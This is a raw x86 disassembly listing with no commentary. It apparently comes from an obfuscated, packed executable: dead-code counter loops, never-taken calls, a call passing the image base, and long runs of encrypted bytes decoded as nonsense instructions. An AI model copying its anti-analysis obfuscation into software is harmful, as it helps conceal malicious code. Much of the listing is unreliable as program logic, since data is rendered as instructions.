  40a084:	cmp    DWORD PTR ds:0x42aee5,0x12
  40a08b:	jae    0x40a110
  40a091:	cmp    DWORD PTR ds:0x42aee5,0x22
  40a098:	jne    0x40a0b2
  40a09e:	push   DWORD PTR [ebp-0x14]
  40a0a1:	push   0x6f60
  40a0a6:	push   DWORD PTR [ebp-0x24]
  40a0a9:	push   DWORD PTR [ebp-0x10]
  40a0ac:	call   DWORD PTR ds:0x41d198
  40a0b2:	jmp    0x40a079
  40a0b7:	and    DWORD PTR ds:0x42aff1,0x0
  40a0c1:	jmp    0x40a0d1
  40a0c6:	mov    eax,ds:0x42aff1
  40a0cb:	inc    eax
  40a0cc:	mov    ds:0x42aff1,eax
  40a0d1:	cmp    DWORD PTR ds:0x42aff1,0x11
  40a0d8:	jae    0x40a110
  40a0de:	cmp    DWORD PTR ds:0x42aff1,0x1e
  40a0e5:	jne    0x40a0fb
  40a0eb:	push   0x89ca
  40a0f0:	push   0x6edd
  40a0f5:	call   DWORD PTR ds:0x41d244
  40a0fb:	jmp    0x40a0c6
  40a100:	mov    ecx,DWORD PTR ds:0x42af0d
  40a106:	mov    eax,ds:0x42afe9
  40a10b:	sub    eax,ecx
  40a10d:	xor    ecx,DWORD PTR [ecx+eax*1]
  40a110:	mov    DWORD PTR [ebp-0x8],0xf89c8539
  40a117:	mov    ecx,DWORD PTR ds:0x42afd5
  40a11d:	xor    eax,eax
  40a11f:	or     eax,DWORD PTR ds:0x42b011
  40a125:	sub    ecx,eax
  40a127:	imul   ecx,DWORD PTR [ecx+eax*1]
  40a12b:	mov    DWORD PTR [ebp-0x14],0xf89c8538
  40a132:	and    DWORD PTR ds:0x42aee1,0x0
  40a13c:	jmp    0x40a14e
  40a141:	mov    ecx,DWORD PTR ds:0x42aee1
  40a147:	inc    ecx
  40a148:	mov    DWORD PTR ds:0x42aee1,ecx
  40a14e:	cmp    DWORD PTR ds:0x42aee1,0x1d
  40a155:	jae    0x40a192
  40a15b:	cmp    DWORD PTR ds:0x42aee1,0xb
  40a162:	jne    0x40a173
  40a168:	push   0x3d1a
  40a16d:	call   DWORD PTR ds:0x41d19c
  40a173:	cmp    DWORD PTR ds:0x42aee1,0xa
  40a17a:	jne    0x40a18d
  40a180:	mov    ecx,DWORD PTR ds:0x42aee1
  40a186:	inc    ecx
  40a187:	mov    DWORD PTR ds:0x42aee1,ecx
  40a18d:	jmp    0x40a141
  40a192:	mov    eax,0x9567
  40a197:	mov    WORD PTR [ebp-0x4],ax
  40a19b:	add    DWORD PTR ds:0x42af3d,ecx
  40a1a1:	jmp    0x40a4ba
  40a1a6:	cmp    al,0xc8
  40a1a8:	ret    0xd2d2
  40a1ab:	ror    ah,cl
  40a1ad:	into   
  40a1ae:	jge    0x40a22b
  40a1b0:	enter  0x2360,0x23
  40a1b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1b5:	sbb    esp,edx
  40a1b7:	stc    
  40a1b8:	js     0x40a232
  40a1ba:	je     0x40a23a
  40a1bc:	js     0x40a236
  40a1be:	fwait
  40a1bf:	xchg   esi,esp
  40a1c1:	adc    BYTE PTR [ebp-0x3a734d38],ah
  40a1c7:	and    al,0xa5
  40a1c9:	mov    ebp,0x5928870a
  40a1ce:	adc    DWORD PTR [edx+0x565b49df],ecx
  40a1d4:	sar    BYTE PTR [eax+edx*2-0x3f622ee0],cl
  40a1db:	ror    ebp,cl
  40a1dd:	jecxz  0x40a1ba
  40a1df:	cmp    DWORD PTR cs:[ebx],edi
  40a1e2:	push   ebp
  40a1e3:	jl     0x40a246
  40a1e5:	mov    eax,cs
  40a1e7:	je     0x40a1e7
  40a1e9:	iret   
  40a1ea:	fild   QWORD PTR [edi+0x12]
  40a1ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a1ee:	push   0xb6d30f61
  40a1f3:	lea    edx,[esi*1-0x630fb085]
  40a1fa:	sar    DWORD PTR [ebx],0x4b
  40a1fd:	xor    ch,BYTE PTR gs:[edx]
  40a200:	loope  0x40a1b1
  40a202:	arpl   WORD PTR [edx],sp
  40a204:	sbb    eax,DWORD PTR [esi+0x7]
  40a207:	dec    ebx
  40a208:	and    esp,DWORD PTR [ebx-0x5d]
  40a20b:	adc    BYTE PTR [esi],bl
  40a20d:	stos   BYTE PTR es:[edi],al
  40a20e:	inc    eax
  40a20f:	adc    ah,BYTE PTR [eax+eax*2]
  40a212:	mov    al,0xba
  40a214:	enter  0x5088,0x5d
  40a218:	outs   dx,BYTE PTR ds:[esi]
  40a219:	(bad)  
  40a21a:	xchg   ecx,eax
  40a21b:	mov    eax,ds:0xdfe5c41
  40a220:	stc    
  40a221:	mov    ebp,0x21246c34
  40a226:	pop    edi
  40a227:	rcr    BYTE PTR [edx],1
  40a229:	outs   dx,DWORD PTR ds:[esi]
  40a22a:	jae    0x40a20a
  40a22c:	lds    eax,FWORD PTR [edx-0x72]
  40a22f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a230:	in     al,dx
  40a231:	test   DWORD PTR [ecx],0x934ef847
  40a237:	je     0x40a27d
  40a239:	test   BYTE PTR [edx-0x7e],dl
  40a23c:	push   0x6ee0b64c
  40a241:	push   0x26
  40a243:	iret   
  40a244:	jge    0x40a294
  40a246:	into   
  40a247:	mov    ds:0xfa891c2c,al
  40a24c:	in     eax,0x22
  40a24e:	xlat   BYTE PTR ds:[ebx]
  40a24f:	push   0x8
  40a251:	retf   0xdb86
  40a254:	jl     0x40a2c6
  40a256:	jb     0x40a236
  40a258:	dec    edi
  40a259:	out    0xcf,al
  40a25b:	in     eax,0xa6
  40a25d:	add    DWORD PTR [ebp-0x2ff50d96],ecx
  40a263:	(bad)  
  40a264:	shl    BYTE PTR [edi-0x511de83f],1
  40a26a:	(bad)  
  40a26b:	neg    DWORD PTR [eax+0x29fe2662]
  40a271:	adc    ch,BYTE PTR [eax-0x2a]
  40a274:	inc    ecx
  40a275:	inc    ebx
  40a276:	out    0x46,al
  40a278:	(bad)  [ecx+ebx*8]
  40a27b:	pop    ss
  40a27c:	cmp    DWORD PTR [eax],esp
  40a27e:	jo     0x40a2eb
  40a280:	lds    ecx,FWORD PTR [edx+eax*1-0x2649dc06]
  40a287:	stc    
  40a288:	jno    0x40a221
  40a28a:	rcr    dh,cl
  40a28c:	push   ecx
  40a28d:	arpl   WORD PTR [ebx],ax
  40a28f:	jge    0x40a27f
  40a291:	lds    ecx,FWORD PTR [esi]
  40a293:	and    al,0xde
  40a295:	fsub   st,st(0)
  40a297:	(bad)  
  40a298:	xor    DWORD PTR [edi+0x14ae3465],esi
  40a29e:	mov    dh,BYTE PTR [ebx]
  40a2a0:	retf   0xd5b2
  40a2a3:	push   eax
  40a2a4:	lock shl BYTE PTR [esi+0x212d0fc3],cl
  40a2ab:	mov    ah,BYTE PTR [esi+0x26ee5f06]
  40a2b1:	pop    ebp
  40a2b2:	ds push ebx
  40a2b4:	jns    0x40a268
  40a2b6:	xor    al,0xb
  40a2b8:	push   ss
  40a2b9:	cld    
  40a2ba:	cmp    BYTE PTR [esp],bl
  40a2bd:	gs adc eax,0xb2e719df
  40a2c3:	int    0x72
  40a2c5:	dec    esi
  40a2c6:	add    DWORD PTR [ebp+0x7b],eax
  40a2c9:	sbb    ebp,DWORD PTR [ecx+eiz*1-0x56]
  40a2cd:	inc    esi
  40a2ce:	mov    al,0x31
  40a2d0:	(bad)  
  40a2d1:	xor    bh,BYTE PTR [esi]
  40a2d3:	fwait
  40a2d4:	sub    DWORD PTR [edi],esp
  40a2d6:	or     al,0xe2
  40a2d8:	xchg   dl,dh
  40a2da:	inc    ebx
  40a2db:	push   esi
  40a2dc:	stos   DWORD PTR es:[edi],eax
  40a2dd:	pop    edx
  40a2de:	imul   ebx,esp,0xf6cd3d9
  40a2e4:	jb     0x40a292
  40a2e6:	popf   
  40a2e7:	hlt    
  40a2e8:	call   DWORD PTR [ebp-0x5d]
  40a2eb:	outs   dx,DWORD PTR ds:[esi]
  40a2ec:	push   eax
  40a2ed:	adc    eax,0x78087045
  40a2f2:	pop    esp
  40a2f3:	push   edi
  40a2f4:	and    esp,edi
  40a2f6:	mov    ecx,?
  40a2f8:	in     al,dx
  40a2f9:	test   ch,dh
  40a2fb:	sahf   
  40a2fc:	or     al,dh
  40a2fe:	push   ebp
  40a2ff:	xchg   cl,ch
  40a301:	jnp    0x40a31e
  40a303:	jmp    0x40a306
  40a305:	add    DWORD PTR [ebp+0x1acb73f4],edx
  40a30b:	loopne 0x40a2e3
  40a30d:	jb     0x40a2ca
  40a30f:	imul   esi,DWORD PTR [ecx-0xfde400f],0x7b
  40a316:	ret    0x6665
  40a319:	mov    ebx,0x5b55bb3f
  40a31e:	jecxz  0x40a35a
  40a320:	dec    ecx
  40a321:	jl     0x40a2b4
  40a323:	pop    eax
  40a324:	push   es
  40a325:	pop    esp
  40a326:	mov    bh,bl
  40a328:	rcr    BYTE PTR [esi],cl
  40a32a:	xor    edx,esp
  40a32c:	lds    edx,FWORD PTR [ebp+0x76343353]
  40a332:	jo     0x40a388
  40a334:	add    ebx,esp
  40a336:	mov    al,0x2a
  40a338:	add    BYTE PTR [ebx+0x68],bh
  40a33b:	cli    
  40a33c:	cli    
  40a33d:	sub    bl,0xed
  40a340:	ds out dx,al
  40a342:	sub    BYTE PTR [ebx+0x47d3a1c6],bl
  40a348:	mov    DWORD PTR [edx],eax
  40a34a:	xchg   ebx,eax
  40a34b:	rol    BYTE PTR [edx+0x7d],cl
  40a34e:	cld    
  40a34f:	jo     0x40a3b1
  40a351:	jmp    0x6ffcd1e4
  40a356:	cdq    
  40a357:	mov    DWORD PTR [ecx-0x59],edx
  40a35a:	or     edx,DWORD PTR [edx-0x71756d59]
  40a360:	push   ss
  40a361:	mov    eax,DWORD PTR [esi-0x72]
  40a364:	and    ah,BYTE PTR [edx+ebp*4-0x6]
  40a368:	and    DWORD PTR [ecx-0x58],ebp
  40a36b:	jmp    0xe5a6:0xf44bcbad
  40a372:	cld    
  40a373:	js     0x40a375
  40a375:	dec    edx
  40a376:	stos   BYTE PTR es:[edi],al
  40a377:	loop   0x40a33d
  40a379:	add    esp,DWORD PTR [edi+0x2b]
  40a37c:	inc    edi
  40a37d:	lock bound eax,QWORD PTR [ecx-0x6d58dd0f]
  40a384:	and    al,0xd1
  40a386:	sub    DWORD PTR [eax],0xc
  40a389:	test   eax,0x47d6363b
  40a38e:	mov    DWORD PTR [esi],ebx
  40a390:	rol    DWORD PTR [ebx+edi*2-0x5475a27b],0xc9
  40a398:	cmp    bh,ch
  40a39a:	ret    
  40a39b:	sar    DWORD PTR [eax],cl
  40a39d:	adc    eax,0x41dc9ff
  40a3a2:	xchg   ecx,eax
  40a3a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3a4:	mov    ah,0xf3
  40a3a6:	ins    BYTE PTR es:[edi],dx
  40a3a7:	cmp    DWORD PTR [ecx],eax
  40a3a9:	sbb    DWORD PTR [ecx+eiz*8],eax
  40a3ac:	cs adc eax,0x8408ea85
  40a3b2:	(bad)  
  40a3b3:	loop   0x40a37c
  40a3b5:	imul   edi,DWORD PTR [eax-0x6da2243b],0x525933c8
  40a3bf:	or     DWORD PTR [ebp+0x49eba26e],edi
  40a3c5:	push   edx
  40a3c6:	hlt    
  40a3c7:	test   al,0x7f
  40a3c9:	inc    edx
  40a3ca:	push   ebp
  40a3cb:	dec    edi
  40a3cc:	jo     0x40a3a1
  40a3ce:	or     edx,DWORD PTR [edx+0x46]
  40a3d1:	rcr    bl,0x2e
  40a3d4:	lds    edx,FWORD PTR [esi]
  40a3d6:	push   cs
  40a3d7:	neg    BYTE PTR [ecx+0x6c87fae0]
  40a3dd:	pop    ebx
  40a3de:	push   esi
  40a3df:	mov    ch,0xe0
  40a3e1:	into   
  40a3e2:	icebp  
  40a3e3:	(bad)  
  40a3e4:	into   
  40a3e5:	sbb    eax,DWORD PTR [edi]
  40a3e7:	adc    al,0x89
  40a3e9:	push   edi
  40a3ea:	push   0xffffff80
  40a3ec:	cmp    dl,BYTE PTR [eax-0x4]
  40a3ef:	and    ebp,DWORD PTR [ebp+0x666d8aae]
  40a3f5:	loope  0x40a416
  40a3f7:	call   0x547db725
  40a3fc:	push   ds
  40a3fd:	shl    ebp,cl
  40a3ff:	and    esp,DWORD PTR [ebp+0x40]
  40a402:	outs   dx,DWORD PTR ds:[esi]
  40a403:	xlat   BYTE PTR ds:[ebx]
  40a404:	fsub   QWORD PTR [eax-0x7436cef9]
  40a40a:	test   eax,0x61b6ac75
  40a40f:	aad    0xd6
  40a411:	pop    ecx
  40a412:	fst    DWORD PTR [edx+0x2a388d86]
  40a418:	mov    cs,WORD PTR [ebx-0x876cf0e]
  40a41e:	pop    ss
  40a41f:	pop    es
  40a420:	xchg   ebp,eax
  40a421:	xchg   edx,eax
  40a422:	ret    0x72ab
  40a425:	mov    edx,0x7fe3a922
  40a42a:	jl     0x40a454
  40a42c:	and    al,0x48
  40a42e:	mov    fs,WORD PTR [ebx-0x49167cc2]
  40a434:	fld    QWORD PTR [ecx+0x6091fb3c]
  40a43a:	push   edi
  40a43b:	fnsave [edx]
  40a43d:	sub    al,BYTE PTR [ecx-0x31]
  40a440:	sbb    al,0x75
  40a442:	popa   
  40a443:	sub    BYTE PTR [edi-0x7ff26b27],0xe3
  40a44a:	jl     0x40a419
  40a44c:	mov    dl,0xb7
  40a44e:	popf   
  40a44f:	sbb    edx,DWORD PTR [esi-0x9dc28b7]
  40a455:	pop    esp
  40a456:	stc    
  40a457:	pop    ds
  40a458:	inc    BYTE PTR [edi]
  40a45a:	xchg   ebp,eax
  40a45b:	cmp    eax,0x740209f1
  40a460:	dec    ecx
  40a461:	xchg   BYTE PTR [eax-0x78],bh
  40a464:	or     ebx,DWORD PTR [edx]
  40a466:	out    0xc6,al
  40a468:	pop    es
  40a469:	int    0x3e
  40a46b:	scas   eax,DWORD PTR es:[edi]
  40a46c:	retf   
  40a46d:	or     bl,ch
  40a46f:	sbb    DWORD PTR ds:0x72691817,0x95d6794
  40a479:	sahf   
  40a47a:	pop    ecx
  40a47b:	mov    ecx,0xabe4e41d
  40a480:	loop   0x40a43d
  40a482:	xchg   edx,eax
  40a483:	jle    0x40a426
  40a485:	dec    edx
  40a486:	xchg   edx,eax
  40a487:	xchg   esi,eax
  40a488:	push   ebx
  40a489:	fisttp WORD PTR [ecx-0x5c54a3f6]
  40a48f:	or     DWORD PTR [ecx-0x1cf3aba4],0x4126d05d
  40a499:	sahf   
  40a49a:	sub    cl,cl
  40a49c:	into   
  40a49d:	(bad)  
  40a49e:	jmp    0xc05a:0x90f4a764
  40a4a5:	bound  esi,QWORD PTR [ebx-0x30b097b8]
  40a4ab:	sbb    BYTE PTR [edx],al
  40a4ad:	mov    dl,0xbf
  40a4af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a4b0:	inc    esi
  40a4b1:	or     ah,dh
  40a4b3:	add    eax,0xd14c024a
  40a4b8:	cmp    DWORD PTR [ebp+ecx*4+0x2581dc45],ecx
  40a4bf:	dec    ebp
  40a4c0:	scas   eax,DWORD PTR es:[edi]
  40a4c1:	inc    edx
  40a4c2:	add    BYTE PTR [ebp-0x51],dh
  40a4c5:	inc    edx
  40a4c6:	add    BYTE PTR [ecx+0x2d81d845],cl
  40a4cc:	or     DWORD PTR [eax+0x30d00042],esi
  40a4d2:	add    BYTE PTR [eax],al
  40a4d4:	mov    eax,DWORD PTR [ebp+0x8]
  40a4d7:	or     ecx,0x3ba0
  40a4dd:	mov    DWORD PTR [ebp-0x20],eax
  40a4e0:	and    DWORD PTR ds:0x42aef1,0x0
  40a4ea:	mov    ecx,DWORD PTR ds:0x42aef1
  40a4f0:	inc    ecx
  40a4f1:	mov    DWORD PTR ds:0x42aef1,ecx
  40a4f7:	cmp    DWORD PTR ds:0x42aef1,0xc
  40a4fe:	jne    0x40a50d
  40a504:	push   DWORD PTR [ebp-0x24]
  40a507:	call   DWORD PTR ds:0x41d1a0
  40a50d:	cmp    DWORD PTR ds:0x42aef1,0xb
  40a514:	jne    0x40a527
  40a51a:	mov    ecx,DWORD PTR ds:0x42aef1
  40a520:	inc    ecx
  40a521:	mov    DWORD PTR ds:0x42aef1,ecx
  40a527:	cmp    DWORD PTR ds:0x42aef1,0x15
  40a52e:	jb     0x40a4ea
  40a534:	push   ebx
  40a535:	lea    eax,[ebp-0x18]
  40a538:	mov    ebx,DWORD PTR ds:0x42af1d
  40a53e:	mov    ecx,DWORD PTR ds:0x42afd1
  40a544:	sub    ecx,ebx
  40a546:	and    ebx,DWORD PTR [ebx+ecx*1]
  40a549:	mov    DWORD PTR [ebp-0x1c],eax
  40a54c:	mov    eax,DWORD PTR [ebp-0x1c]
  40a54f:	and    DWORD PTR ds:0x42b001,0x0
  40a559:	jmp    0x40a56d
  40a55e:	xor    ebx,ebx
  40a560:	add    ebx,DWORD PTR ds:0x42b001
  40a566:	inc    ebx
  40a567:	mov    DWORD PTR ds:0x42b001,ebx
  40a56d:	cmp    DWORD PTR ds:0x42b001,0x15
  40a574:	jae    0x40a597
  40a57a:	cmp    DWORD PTR ds:0x42b001,0x25
  40a581:	jne    0x40a592
  40a587:	push   0x6372
  40a58c:	call   DWORD PTR ds:0x41d0cc
  40a592:	jmp    0x40a55e
  40a597:	push   esi
  40a598:	and    DWORD PTR ds:0x42afc9,0x0
  40a5a2:	mov    ebx,DWORD PTR ds:0x42afc9
  40a5a8:	inc    ebx
  40a5a9:	mov    DWORD PTR ds:0x42afc9,ebx
  40a5af:	cmp    DWORD PTR ds:0x42afc9,0x7
  40a5b6:	jne    0x40a5dc
  40a5bc:	push   DWORD PTR [ebp-0x14]
  40a5bf:	push   0x2cb6
  40a5c4:	push   DWORD PTR [ebp-0x1c]
  40a5c7:	push   0x8d7c
  40a5cc:	push   0x42b1e2
  40a5d1:	push   0x400000
  40a5d6:	call   DWORD PTR ds:0x41d248
  40a5dc:	cmp    DWORD PTR ds:0x42afc9,0x6
  40a5e3:	jne    0x40a5f6
  40a5e9:	mov    ebx,DWORD PTR ds:0x42afc9
  40a5ef:	inc    ebx
  40a5f0:	mov    DWORD PTR ds:0x42afc9,ebx
  40a5f6:	cmp    DWORD PTR ds:0x42afc9,0x1b
  40a5fd:	jb     0x40a5a2
  40a603:	push   edi
  40a604:	mov    edi,0xf89f2e50
  40a609:	jmp    0x40a922
  40a60e:	(bad)  
  40a60f:	ror    bh,0xca
  40a612:	int    0xd9
  40a614:	(bad)  
  40a616:	dec    eax
  40a617:	xor    BYTE PTR [edi+edi*2+0x40],dh
  40a61b:	mov    al,ds:0xfede8e05
  40a620:	js     0x40a69a
  40a622:	je     0x40a6a2
  40a624:	js     0x40a69e
  40a626:	lods   al,BYTE PTR ds:[esi]
  40a627:	mov    ds:0x8bf53342,eax
  40a62c:	xchg   edx,eax
  40a62d:	sti    
  40a62e:	adc    eax,0x5d8cf90d
  40a633:	retf   0x62d1
  40a636:	or     eax,0x6621436
  40a63b:	pop    esp
  40a63c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a63d:	stc    
  40a63e:	aam    0x68
  40a640:	inc    edi
  40a641:	jne    0x40a693
  40a643:	enter  0x48dc,0x9b
  40a647:	mov    dh,0xfb
  40a64a:	mov    BYTE PTR [edx+0x2d],0xe5
  40a64e:	call   0xe317:0x748b21bc
  40a655:	mov    ebx,0xbede1142
  40a65a:	pop    ebx
  40a65b:	sahf   
  40a65c:	mov    bl,0xb6
  40a65e:	retf   
  40a65f:	imul   esp,DWORD PTR [edi+ecx*8-0x11],0x75c1988
  40a667:	sbb    esi,DWORD PTR [ebp-0x53]
  40a66a:	int3   
  40a66b:	and    BYTE PTR [edi+esi*8-0x2762e8a9],bl
  40a672:	push   edi
  40a673:	ffree  st(3)
  40a675:	mov    ecx,DWORD PTR [esi]
  40a677:	push   es
  40a678:	push   ebx
  40a679:	fidivr WORD PTR [edx+0x10]
  40a67c:	into   
  40a67d:	fisubr WORD PTR [si]
  40a680:	cmp    DWORD PTR [ebx-0x7e],edx
  40a683:	dec    ebx
  40a684:	lahf   
  40a685:	push   eax
  40a686:	aad    0xe5
  40a688:	mov    BYTE PTR [ebp+0x29],cl
  40a68b:	dec    esi
  40a68c:	mov    ch,0xaf
  40a68e:	pop    edx
  40a68f:	sub    DWORD PTR [ebp+0x2fa3b32e],ecx
  40a695:	cmovo  edx,DWORD PTR [esi+0x7c93cfec]
  40a69c:	or     esp,ebx
  40a69e:	adc    edx,ecx
  40a6a0:	add    al,0x26
  40a6a2:	sbb    DWORD PTR ds:0x2590ddbb,edx
  40a6a8:	(bad)  
  40a6a9:	mov    ebp,DWORD PTR ss:[eax+0xbe2d76d]
  40a6b0:	jne    0x40a70c
  40a6b2:	mov    DWORD PTR [esi],ebx
  40a6b4:	push   edx
  40a6b5:	(bad)  
  40a6b6:	sti    
  40a6b7:	push   esi
  40a6b8:	scas   eax,DWORD PTR es:[edi]
  40a6b9:	adc    BYTE PTR [esi],0x8e
  40a6bc:	adc    al,0xa
  40a6be:	push   esi
  40a6bf:	dec    esp
  40a6c0:	mov    cl,0xa6
  40a6c2:	pop    ecx
  40a6c3:	shr    bh,1
  40a6c5:	xlat   BYTE PTR ds:[ebx]
  40a6c6:	ins    BYTE PTR es:[edi],dx
  40a6c7:	fadd   st,st(1)
  40a6c9:	cld    
  40a6ca:	mov    eax,ds:0x37316cce
  40a6cf:	(bad)  
  40a6d0:	shr    BYTE PTR [ecx],0x2f
  40a6d3:	aam    0xad
  40a6d5:	xor    edi,DWORD PTR [ecx+0xb]
  40a6d8:	xor    dl,dh
  40a6da:	fadd   st(7),st
  40a6dc:	stos   DWORD PTR es:[edi],eax
  40a6dd:	std    
  40a6de:	mov    ch,0x5c
  40a6e0:	dec    ebp
  40a6e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a6e2:	sub    edx,DWORD PTR [edx]
  40a6e4:	push   0xffffff85
  40a6e6:	scas   al,BYTE PTR es:[edi]
  40a6e7:	cmc    
  40a6e8:	jecxz  0x40a715
  40a6ea:	jecxz  0x40a6fa
  40a6ec:	inc    ecx
  40a6ed:	jecxz  0x40a67b
  40a6ef:	xor    BYTE PTR [ebx-0x9],ah
  40a6f2:	xor    BYTE PTR [ecx+0x2b],al
  40a6f5:	outs   dx,DWORD PTR ds:[esi]
  40a6f7:	mov    edx,0xcedfc735
  40a6fc:	push   ds
  40a6fd:	retf   0xf4ff
  40a700:	in     eax,dx
  40a701:	xlat   BYTE PTR ds:[ebx]
  40a702:	stc    
  40a703:	aaa    
  40a704:	std    
  40a705:	sbb    eax,0x21376560
  40a70a:	dec    esi
  40a70b:	les    ebx,FWORD PTR [esi+0x2b]
  40a70e:	lods   eax,DWORD PTR ds:[esi]
  40a70f:	loopne 0x40a757
  40a711:	fild   DWORD PTR [ecx-0x46]
  40a714:	je     0x40a761
  40a716:	jg     0x40a772
  40a718:	(bad)  
  40a719:	sub    esp,ecx
  40a71b:	or     ebp,DWORD PTR [esi-0xee19c11]
  40a721:	jno    0x40a779
  40a723:	popa   
  40a724:	push   es
  40a725:	mov    eax,ds:0x51cfd2f2
  40a72a:	fwait
  40a72b:	sub    al,0x24
  40a72d:	aam    0x2b
  40a72f:	sbb    ebp,esi
  40a731:	out    dx,eax
  40a732:	push   ebx
  40a733:	pop    edx
  40a734:	mov    BYTE PTR [esi],ch
  40a736:	mov    WORD PTR [ecx],ss
  40a738:	mov    ds:0xa866d23f,al
  40a73d:	in     eax,0xa1
  40a73f:	ss mov edi,0x1482573c
  40a745:	outs   dx,BYTE PTR ds:[esi]
  40a746:	mov    esi,0x27c76bbd
  40a74b:	or     esp,DWORD PTR [esi]
  40a74d:	push   ds
  40a74e:	and    esi,DWORD PTR [eax-0x3af0343f]
  40a754:	mov    eax,DWORD PTR [eax+0x5a406f16]
  40a75a:	popa   
  40a75b:	cmp    al,0x88
  40a75d:	mov    eax,0xa7031c10
  40a762:	fisubr DWORD PTR [ebx-0x4]
  40a765:	ror    DWORD PTR [ebx-0x46ba669],1
  40a76b:	ret    0x6cca
  40a76e:	ins    BYTE PTR es:[edi],dx
  40a76f:	popf   
  40a770:	jl     0x40a741
  40a772:	xchg   edi,eax
  40a773:	xor    ebp,eax
  40a775:	test   eax,0x7c79a69d
  40a77a:	sbb    bl,BYTE PTR [ebx]
  40a77c:	repz pop esp
  40a77e:	sbb    edx,DWORD PTR [eax-0x13a26cef]
  40a784:	mov    BYTE PTR [edi-0x25],al
  40a787:	sub    esp,edi
  40a789:	add    al,0x7
  40a78b:	adc    edx,DWORD PTR [esi-0x2d9aef1a]
  40a791:	jo     0x40a769
  40a793:	adc    edx,0xe9c6597e
  40a799:	(bad)  
  40a79a:	sub    ecx,ebx
  40a79c:	pop    ebp
  40a79d:	mov    eax,0x20751de7
  40a7a2:	shr    BYTE PTR [edx+0x2c],0xe1
  40a7a6:	dec    ebp
  40a7a7:	dec    esi
  40a7a8:	jbe    0x40a7ce
  40a7aa:	ds dec edx
  40a7ac:	ds in  eax,0x54
  40a7af:	jecxz  0x40a820
  40a7b1:	into   
  40a7b2:	xor    al,0x26
  40a7b4:	out    0x0,eax
  40a7b6:	imul   ebp,DWORD PTR [esi],0x6
  40a7b9:	cmp    dh,BYTE PTR [eax+0x2d]
  40a7bc:	fadd   st(0),st
  40a7be:	mov    bh,0x4d
  40a7c0:	cs pop ebx
  40a7c2:	rcr    BYTE PTR [edx-0x7a],1
  40a7c5:	sti    
  40a7c6:	adc    eax,0xd47c32f3
  40a7cb:	adc    ah,BYTE PTR [edx+eiz*4]
  40a7ce:	push   0xffffffdb
  40a7d0:	push   ebp
  40a7d1:	in     eax,0x3f
  40a7d3:	fsubr  QWORD PTR [esi]
  40a7d5:	cmp    edi,DWORD PTR [edx+edi*8+0xa543828]
  40a7dc:	enter  0x51cf,0x2b
  40a7e0:	retf   0xd1a2
  40a7e3:	adc    edi,DWORD PTR [edi]
  40a7e5:	jg     0x40a76f
  40a7e7:	test   DWORD PTR [eax-0x7a],0x6d56ff7
  40a7ee:	leave  
  40a7ef:	push   cs
  40a7f0:	xor    eax,0x395fa9d
  40a7f5:	out    dx,al
  40a7f6:	mov    ebx,0x127ba4f5
  40a7fb:	std    
  40a7fc:	sub    bl,BYTE PTR [ebx]
  40a7fe:	mov    ebx,0x2afb5a82
  40a803:	js     0x40a7bf
  40a805:	and    DWORD PTR [edx-0x35],esp
  40a808:	(bad)  
  40a80a:	mov    dh,0xd
  40a80c:	shr    DWORD PTR [edx],1
  40a80e:	test   al,0xff
  40a810:	add    BYTE PTR [esi+0x13ec7ab7],cl
  40a816:	mov    ecx,0x35463a5c
  40a81b:	sub    eax,0x87d462da
  40a820:	and    ch,BYTE PTR [edx]
  40a822:	mov    edi,0x305b5675
  40a827:	adc    al,0xcb
  40a829:	push   es
  40a82a:	jp     0x40a85f
  40a82c:	sbb    ch,BYTE PTR [ebp-0x78]
  40a82f:	and    eax,0xb3d26eb3
  40a834:	aad    0x33
  40a836:	sbb    eax,0x209d3e68
  40a83b:	test   eax,0x41b5d97a
  40a840:	jmp    0x959fc777
  40a845:	mov    ebx,0xeb3c7033
  40a84a:	and    eax,0xb2c8afbb
  40a84f:	jg     0x40a7f6
  40a851:	dec    ecx
  40a852:	push   ecx
  40a853:	sti    
  40a854:	push   ecx
  40a855:	push   ebp
  40a856:	mov    WORD PTR [esi],cs
  40a858:	ret    
  40a859:	les    eax,FWORD PTR [ebp+0x1e]
  40a85c:	outs   dx,BYTE PTR ds:[esi]
  40a85d:	mov    fs,WORD PTR [bx+di+0x71]
  40a861:	dec    ebp
  40a862:	add    bl,ch
  40a864:	sti    
  40a865:	loopne 0x40a822
  40a867:	jp     0x40a83e
  40a869:	jnp    0x40a83a
  40a86b:	imul   esi,DWORD PTR [ebp-0x29a44227],0x48
  40a872:	in     al,dx
  40a873:	vmovss xmm1,xmm3,xmm0
  40a877:	pop    edx
  40a878:	cmp    bl,BYTE PTR [ecx+0x6967af30]
  40a87e:	rcl    BYTE PTR [eax+0x33],cl
  40a881:	fmul   DWORD PTR [ebx+0x3d]
  40a884:	sahf   
  40a885:	(bad)  
  40a887:	sub    al,0x79
  40a889:	aaa    
  40a88a:	add    DWORD PTR [ecx+0x4501c6b1],edx
  40a890:	cld    
  40a891:	sbb    BYTE PTR [ecx-0x5c86d404],al
  40a897:	dec    edi
  40a898:	sbb    BYTE PTR [edx+0x5ca53b6c],cl
  40a89e:	test   BYTE PTR [bx+0x2f],dl
  40a8a2:	aam    0xa5
  40a8a4:	cmp    ah,cl
  40a8a6:	dec    edx
  40a8a7:	das    
  40a8a8:	sbb    cl,dh
  40a8aa:	idiv   DWORD PTR [edx+0x136da398]
  40a8b0:	das    
  40a8b1:	mov    ah,0xa7
  40a8b3:	xchg   ebx,eax
  40a8b4:	scas   eax,DWORD PTR es:[edi]
  40a8b5:	push   es
  40a8b6:	das    
  40a8b7:	icebp  
  40a8b8:	scas   eax,DWORD PTR es:[edi]
  40a8b9:	mov    BYTE PTR ds:0x9072cd88,ch
  40a8bf:	dec    edx
  40a8c0:	fcmovnb st,st(3)
  40a8c2:	push   0x530fa5fb
  40a8c7:	pusha  
  40a8c8:	neg    ch
  40a8ca:	fistp  DWORD PTR [edi]
  40a8cc:	mov    al,ds:0x990f496c
  40a8d1:	mov    bh,bl
  40a8d3:	pop    ds
  40a8d4:	fadd   QWORD PTR [edi+0x12]
  40a8d7:	mov    ds:0x278f43d4,eax
  40a8dc:	jae    0x40a8d8
  40a8de:	xor    BYTE PTR [ebx+0x5d],ch
  40a8e1:	je     0x40a8b2
  40a8e3:	loop   0x40a8e8
